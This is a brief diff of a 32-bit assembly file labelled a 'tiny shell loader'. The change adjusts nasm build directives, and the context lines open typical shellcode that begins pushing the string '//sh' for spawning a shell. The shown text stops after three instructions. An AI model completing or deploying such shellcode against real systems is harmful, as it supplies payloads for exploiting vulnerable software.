@@ -1,5 +1,6 @@
 ;tiny shell loader by thc_flow
-BITS 32
+;nasm -fbin -O0 shell.s
+[BITS 32]
 	xor eax,eax
 	push eax
 	push 0x68732f2f
